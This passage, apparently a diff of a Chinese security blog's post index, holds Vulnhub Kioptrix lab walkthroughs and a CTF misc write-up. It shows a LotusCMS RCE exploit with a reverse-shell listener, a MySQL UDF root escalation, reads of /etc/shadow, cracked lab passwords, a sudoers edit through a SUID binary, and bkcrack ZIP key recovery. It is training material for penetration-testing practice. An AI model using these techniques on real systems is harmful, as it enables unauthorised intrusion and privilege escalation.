'lib_mysqludf_sys.so';</code>，<strong>sys_eval可以执行系统命令并在屏幕上显示</strong>，<code>select * from mysql.func</code>查看是否创建成功</li></ul><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305214900539.png" alt="image-20240305214900539" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>成功创建</strong></p><ul><li>利用sys_eval实现系统命令，我们直接来修改root密码，<code>select sys_eval(&quot;sudo passwd root&quot;)</code>，然后直接设置root的新密码，再登录，成功拿到root</li></ul><p><em>后来发现sys_exec也可以执行系统命令，但是他无法打印在屏幕上，也无法交互，所以可以用来修改一些权限，比如<code>chmod u+x /bin/bash</code>或者用usermod修改用户所在的组，提权</em></p><blockquote><p><a href="https://shifty0g.github.io/posts/kioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g</a></p><p><a href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn)</a></p></blockquote><p><img src="/2024/03/05/Kioptrix-Level-1-3/image-20240305220016944.png" alt="image-20240305220016944" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h2 id="学习总结与参考链接"><a class="markdownIt-Anchor" href="#学习总结与参考链接"></a> 学习总结与参考链接</h2><ul><li>enum4linux的使用场景</li></ul><blockquote><p>enum4linux的介绍：<a href="https://blog.csdn.net/qq_63844103/article/details/127219997">【网安神器篇】——enum4linux枚举工具-CSDN博客</a></p></blockquote><ul><li><p>涉及到80端口，可以先扫起来，然后去搜集信息，拿到shell之后，<strong>要先查看源代码</strong>，看看有没有漏掉的信息</p></li><li><p>受限shell绕过方法：echo</p></li></ul><blockquote><p>lshell绕过限制：<a href="https://www.aldeid.com/wiki/Lshell">Lshell - 醛 (aldeid.com)</a></p></blockquote><ul><li>mysql中的udf提权，<strong>mysql还有很多种提权方式有待学习</strong></li></ul><blockquote><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a></p></blockquote><ul><li>参考walkthrough</li></ul><blockquote><p><a href="https://shifty0g.github.io/posts/kioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g</a></p><p><a href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn)</a></p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>类OSCP靶机练习</category>
+          
+          <category> 类OSCP靶机练习 </category>
+          
       </categories>
-      <tags>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kioptrix Level 1.2(#3)</title>
-    <url>/2024/02/11/Kioptrix_Level_1.2/</url>
-    <content><![CDATA[<h1 id="kioptrix-level-123"><a class="markdownIt-Anchor" href="#kioptrix-level-123"></a> Kioptrix Level 1.2(#3)</h1>
-<h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2>
-<h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3>
-<ul>
-<li>nmap扫描ip，得到IP为<code>192.168.89.139</code></li>
-<li>nmap扫描端口以及端口服务</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 00:12 EST</span><br><span class="line">Nmap scan report for 192.168.89.139</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds</span><br></pre></td></tr></table></figure>
-<p>发现开放了ssh和http服务</p>
-<ul>
-<li>浏览器访问<code>http://192.168.89.139</code></li>
-</ul>
-<img src="/2024/02/11/Kioptrix_Level_1.2/截屏2024-02-13_下午8.24.57.png" alt="截屏2024-02-13_下午8.24.57" style="zoom:67%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
-<ul>
-<li>点击Login，发现一个登录界面，<code>Proudly Powered by:LotusCMS</code>，<strong>LotusCMS</strong>是关键，CMS（Content  Management System 内容管理系统）</li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.25.32.png" alt="截屏2024-02-13_下午8.25.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><em>看到登录框，想起上一道题，可能存在sql注入</em></p>
-<ul>
-<li>dirsearch扫描网址：<code>dirsearch --url http://192.168.89.139</code></li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.36.19.png" alt="截屏2024-02-13_下午8.36.19" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>发现了一个phpmyadmin，还有一个gallery</strong></p>
-<ul>
-<li>查看<code>http://192.168.89.139/phpmyadmin/</code>，<strong>需要拿到root密码</strong></li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.57.06.png" alt="截屏2024-02-13_下午9.57.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><em>由之前信息收集阶段的结果可知 phpmyadmin 的版本为 <strong>2.11.3</strong>，搜索可知该版本存在&quot;万能密码&quot;,使用 <strong>‘localhost’@'@&quot;</strong> 即可登陆，但是只有一个 <strong>information_schema</strong> ，没什么用</em></p>
-<blockquote>
-<p><a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#lotuscms">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></p>
-</blockquote>
-<ul>
-<li>查看<code>http://192.168.89.139/gallery/</code>，dirsearch扫一下目录</li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.58.54.png" alt="截屏2024-02-13_下午8.58.54" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>发现了一个后台/gallery/gadmin，<strong>Username为admin</strong>，一个db.sql文件<img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.00.18.png" alt="截屏2024-02-13_下午9.00.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></li>
-</ul>
-<p><strong>后台可以尝试sql注入</strong></p>
-<p><strong>db.sql部分文件内容如下：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `gallarific_users` (</span><br><span class="line">  `userid` int(11) NOT NULL auto_increment,</span><br><span class="line">  `username` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `password` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `usertype` enum(&#x27;superuser&#x27;,&#x27;normaluser&#x27;) NOT NULL default &#x27;superuser&#x27;,</span><br><span class="line">  `firstname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `lastname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `email` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `datejoined` int(11) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `website` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `issuperuser` tinyint(4) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `photo` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `joincode` varchar(20) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  PRIMARY KEY  (`userid`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-<h4 id="总结突破方向cmsweb"><a class="markdownIt-Anchor" href="#总结突破方向cmsweb"></a> 总结突破方向——cms+web</h4>
-<ul>
-<li>
-<p>Login是否存在sql注入</p>
-</li>
-<li>
-<p>LotusCMS 是否存在可利用的漏洞</p>
-</li>
-<li>
-<p>是否能拿到phpmyadmin后台的root用户密码，查看数据库信息</p>
-</li>
-<li>
-<p>/gallery/gadmin是否存在sql注入</p>
-</li>
-</ul>
-<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3>
-<h4 id="lotuscms漏洞利用"><a class="markdownIt-Anchor" href="#lotuscms漏洞利用"></a> lotusCMS漏洞利用</h4>
-<ul>
-<li>
-<p>在github中找到python利用的lotuscms3.0RCE漏洞：<a href="https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit">https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit</a></p>
-</li>
-<li>
-<p>nc监听444端口:<code> nc -nvlp 444</code>，同时执行<code> python lotuscms.py -rh 192.168.89.139 -lh 192.168.89.137</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help  show this help message and exit.</span><br><span class="line">-rh RHOST   Target Host.</span><br><span class="line">-rp RPORT   Target Port. Default: 80.</span><br><span class="line">-u URI      URI (i.e /lms/. Default: /</span><br><span class="line">-lh LHOST   Local Host.</span><br><span class="line">-lp LPORT   Local Port. Default: 444</span><br><span class="line">-s          SSL/TLS enable (True/False). Default: False</span><br></pre></td></tr></table></figure>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229153523165.png" alt="image-20240229153523165" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>成功拿到www-data，但是这只是一个普通用户权限，由于我们扫出了重要的网站后台，先利用这个用户权限，查看网站源文件，看是否存在敏感信息</strong></p>
-</li>
-<li>
-<p>通过www-data，我们可以查看/etc/passwd /etc/shadow，这些信息，<em>里面能看到后面能查到的dreg和loneferret两个用户</em></p>
-</li>
-<li>
-<p>在网页根目录中查找敏感信息，通过<code>cat gconfig.php</code>成功看到mysql的username和password，可以直接登录phpmyadmin了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>拿到phpmyadmin后台root密码后，登录后台，看到一些<strong>数据库信息</strong></p>
-</li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.34.41.png" alt="截屏2024-02-13_下午8.34.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>可以看到我们要找的gallery数据库，gallarific_users这张表，也就是gallery/gadmin后台的登录用户名和密码</li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.15.57.png" alt="截屏2024-02-13_下午9.15.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>拿到password <code>n0t7t1k4</code></strong></p>
-<p>利用<code>admin </code>和<code>n0t7t1k4</code>登录网站后台gallery/gadmin，但是发现网站里面，没有什么特别的东西，<em>其实可以看到一些上传功能和评论功能，可以试试，这里不赘述。</em></p>
-<ul>
-<li>继续翻找phpmyadmin，发现了一个叫做dev_accounts的表，里面存了username和password，这两个用户我们在之前通过www-data，查看用户列表时看到过，因此如果破解了密码可以利用<code>ssh</code>登录</li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229194301766.png" alt="image-20240229194301766" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>通过<code>md5</code>解密，得到账户信息 [md5在线解密](<a href="https://www.cmd5.com/default.aspx?hashtype=md5&amp;answer=cWluZ21pbmcxMTI0MTUu">md5在线解密破解,md5解密加密 (cmd5.com)</a>)</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dreg Mast3r</span><br><span class="line">loneferret starwars</span><br></pre></td></tr></table></figure>
-<p><em>看到别人的walkthrough发现这里也可以hydra爆破，详情请看  <a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></em></p>
-<ul>
-<li>目标主机开了ssh服务，尝试利用ssh登录</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss dreg@192.168.89.139</span><br><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.89.139</span><br></pre></td></tr></table></figure>
-<p><em>直接ssh，会导致报错，原因大概是对方使用的ssh版本比较低，详情请看<a href="https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss">SSH 返回：未找到匹配的主机密钥类型。他们的报价：ssh-dss - 询问 Ubuntu (askubuntu.com)</a></em></p>
-<h4 id="简单查看两个用户的权限"><a class="markdownIt-Anchor" href="#简单查看两个用户的权限"></a> 简单查看两个用户的权限</h4>
-<ul>
-<li><code>sudo -l</code> 查看当前用户有哪些被sudo服务授权的命令，<strong>可以发现loneferret下ht和su</strong></li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229202721535.png" alt="image-20240229202721535" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><em>按理说，我们直接<code>sudo su root</code>就可以直接切换成root，但是发现su的路径貌似写错了，正确的应该是<code>/bin/su</code></em></p>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/Screenshot2024-02-29_21.03.16.png" alt="Screenshot2024-02-29_21.03.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h5 id="提权思路"><a class="markdownIt-Anchor" href="#提权思路"></a> 提权思路</h5>
-<ul>
-<li>
-<p>利用内核信息提权</p>
-</li>
-<li>
-<p>SUID提权：直接利用<code>sudo ht</code>编辑<code>/etc/sudoers</code>文件提权</p>
-</li>
-</ul>
-<h3 id="权限提升-privilege-escalation"><a class="markdownIt-Anchor" href="#权限提升-privilege-escalation"></a> 权限提升 privilege escalation</h3>
-<h4 id="利用les工具内核提权"><a class="markdownIt-Anchor" href="#利用les工具内核提权"></a> 利用LES工具内核提权</h4>
-<blockquote>
-<p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com)</a></p>
-<p>LES 工具旨在帮助检测给定 Linux 内核/基于 Linux 的机器的安全缺陷。</p>
-</blockquote>
-<ul>
-<li>利用les工具，查看系统是否有漏洞</li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229161417872.png" alt="image-20240229161417872" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>
-<p>先通过<code>uname -a</code>查看系统信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU /Linux  </span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>在kali中<code>bash ./les.sh --uname &quot;Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux&quot;</code></p>
-</li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229162455063.png" alt="image-20240229162455063" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>发现可以直接用脏牛，但具体没实现出来，因为两个用户都有很多权限限制
-<ul>
-<li>可以利用msf中的后渗透meterpreter上传，<em>但由于oscp限制msf的使用，这里不叙述，感兴趣的可以查看这篇文章的内核提权部分 <a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></em></li>
-</ul>
-</li>
-</ul>
-<h4 id="suid提权"><a class="markdownIt-Anchor" href="#suid提权"></a> SUID提权</h4>
-<blockquote>
-<p>关于SUID提权的介绍与总结：<a href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
-</blockquote>
-<ul>
-<li>查看ht是否具有suid，<code>ls -al /usr/local/bin/ht</code>，发现rws，s表示具有suid，果然</li>
-<li>直接<code>ht</code>，修改<code>/etc/sudoers</code>，添加<code>/bin/bash</code>或修改su的路径为<code>!/bin/su</code></li>
-<li>这里我的kali很奇怪，直接ht里面修改会导致<strong>segmentation fault</strong>，只能通过<code>sudo ht /etc/sudoers</code>，而且得改二进制才行😓，搞了很久🤮。最后直接把lonferret改成了ALL=（ALL）ALL</li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229221121593.png" alt="image-20240229221121593" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>然后就直接<code>sudo su root</code>，<strong>成功拿到root</strong></li>
-</ul>
-<p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229221244697.png" alt="image-20240229221244697" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h2 id="参考列表"><a class="markdownIt-Anchor" href="#参考列表"></a> 参考列表</h2>
-<blockquote>
-<p><a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></p>
-</blockquote>
-<blockquote>
-<p><a href="https://www.cnblogs.com/wsec/p/vulhub0x03.html">0×03 Vulnhub 靶机渗透总结之 KIOPTRIX: LEVEL 1.2 (#3) SQL注入+sudo提权 - wsec - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-<blockquote>
-<p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com)</a></p>
-</blockquote>
-<blockquote>
-<p><a href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2023春秋杯_Misc</title>
+      <link href="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/"/>
+      <url>/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/</url>
+      
+        <content type="html"><![CDATA[<h1 id="谁偷了我的外卖"><a class="markdownIt-Anchor" href="#谁偷了我的外卖"></a> 谁偷了我的外卖</h1><h2 id="题目描述"><a class="markdownIt-Anchor" href="#题目描述"></a> 题目描述</h2><ul><li>小凯最近入职了大厂，但是在工作途中出现了一些麻烦事，怎么办呢</li></ul><h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2><ul><li>拿到手是一张jpg</li></ul><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/小凯.jpg" alt="小凯" style="zoom:33%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><ul><li>binwalk分析一下，发现里面有个压缩包，binwalk -e 不管用，foremost提取一下</li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304160239092.png" alt="image-20240304160239092" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>010里还有个提示：<code>I can give you a hint: - = / But there was a takeaway that was partially eaten.</code></li><li>拿到压缩包，是加密的，里面是一个flag文件夹和很多“外卖”文件</li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304160712556.png" alt="image-20240304160712556" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>观察发现有序的且“_”后面的4个字符很像base64，再加上前面有序号，以及提示信息，很容易猜测是要把这些按顺序组合成一段base64</strong></p><ul><li>我先随便提取一下，形成一个文件夹，这样虽然文件是空的，但是文件名都在，再利用批量处理文件夹名称，再利用python</li></ul><p><strong>能发现第一个少了四个字母</strong></p><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304161318875.png" alt="处理文件夹文件名称" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding =gbk</span></span><br><span class="line"><span class="keyword">from</span> natsort <span class="keyword">import</span> ns, natsorted</span><br><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line">folder = <span class="string">r&quot;/Users/madison/Desktop/wmx&quot;</span></span><br><span class="line">files = os.listdir(folder)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">files_1 = natsorted(files,alg=ns.PATH)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files_1:</span><br><span class="line">    flag+=i</span><br><span class="line">lst = re.findall(<span class="string">&#x27;_([\w|+|=|-]&#123;4&#125;)&#x27;</span>,flag)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">str</span>+=i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>))</span><br></pre></td></tr></table></figure><p><strong>先把第2个文件开始的提取出来</strong></p><ul><li>base64解码，可以在末尾发现应该是压缩包</li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304161819149.png" alt="image-20240304161819149" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>补上文件头<code>504b03</code>的base64:<code>UEsD</code></li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162516972.png" alt="image-20240304162516972" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162720172.png" alt="image-20240304162720172" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>成功拿到download.zip</strong></p><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162046748.png" alt="image-20240304162046748" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>这两个文件就是之前加密压缩包flag文件夹里的两个文件，还差一个txt.galf，这个明显就是flag.txt反过来</strong></p><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162147928.png" alt="image-20240304162147928" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>查看这两个文件<ul><li>md文件里有一半的flag<code>flag&#123;W1sh_y0u_AaaAaaaa</code>，钥匙.png是一张用<strong>bandizip</strong>压缩文件的图，使用的算法是<strong>ZipCrypto</strong>，猜测要使用明文爆破bkcrack了</li></ul></li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304162805829.png" alt="image-20240304162805829" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304163109001.png" alt="image-20240304163109001" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li><p>用bandizip压缩提取出来的md或png，记住要<strong>选用zipcrypto算法</strong>，算法需要一致，这里以压缩png为例，压缩成crack.zip</p></li><li><p>用bkcrack明文爆破出密钥</p></li></ul><p>-C 对应待解密的压缩包，-c为待解密压缩包里的某个加密文件，-P为明文压缩包，-p为已知的明文文件或明文信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C wmx.zip -c 外卖箱/flag/小凯的奋斗故事.md -P crack.zip -p 小凯的奋斗故事.md</span><br></pre></td></tr></table></figure><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304164507564.png" alt="image-20240304164507564" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>拿到密钥：48ff002a 56e00484 380c5c49</strong></p><ul><li>利用密钥破解</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C wmx.zip -k 48ff002a 56e00484 380c5c49 -U new.zip 1234 </span><br></pre></td></tr></table></figure><p>-k为密钥，-U为你设置的新的zip，和新zip的密码（会把原来的zip里的东西复制到new.zip中，并且new.zip的密码被覆盖为1234）</p><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304164738068.png" alt="image-20240304164738068" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>成功提取并打开txt.galf</li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304164841781.png" alt="image-20240304164841781" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>结合文件名以及上半部分的flag，可知，文本内容需要倒置过来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9&#125;</span><br></pre></td></tr></table></figure><h1 id="明文混淆复现"><a class="markdownIt-Anchor" href="#明文混淆复现"></a> 明文混淆（复现）</h1><h2 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2"></a> 题目描述</h2><ul><li>小明新买了一台windows电脑，给了小文一个经过两层混淆的webshell，，但压缩包密码搞忘了。听说webshell密码是一个叫flag的东西。。。</li></ul><h2 id="解题过程-2"><a class="markdownIt-Anchor" href="#解题过程-2"></a> 解题过程</h2><ul><li>压缩包是加密的，一一排除伪加密，暴力破解，剩下明文爆破</li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304203835579.png" alt="image-20240304203835579" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>bkcrack先查看一下压缩包的加密算法：<code>bkcrack -L</code></li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304203726863.png" alt="image-20240304203726863" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>果然是ZipCrypto，明晃晃的明文爆破了</strong></p><ul><li>从LICENSE.txt 入手，所有的LICENSE.txt，都有换行，把明文设置为12个以上的空格</li><li>bkcrack爆破</li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304211905788.png" alt="image-20240304211905788" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304211926934.png" alt="image-20240304211926934" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>提取出shell2.php，解混淆</li></ul><p><img src="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/image-20240304212121097.png" alt="image-20240304212121097" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><em>php解混淆知识有待加强😭</em></p>]]></content>
+      
+      
       <categories>
-        <category>类OSCP靶机练习</category>
+          
+          <category> CTF做题记录 </category>
+          
       </categories>
-      <tags>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kioptrix Level 1.1(#2)</title>
-    <url>/2024/02/03/Kioptrix_Level_1.1/</url>
-    <content><![CDATA[<h1 id="kioptrix-level-112"><a class="markdownIt-Anchor" href="#kioptrix-level-112"></a> Kioptrix Level 1.1(#2)</h1>
-<blockquote>
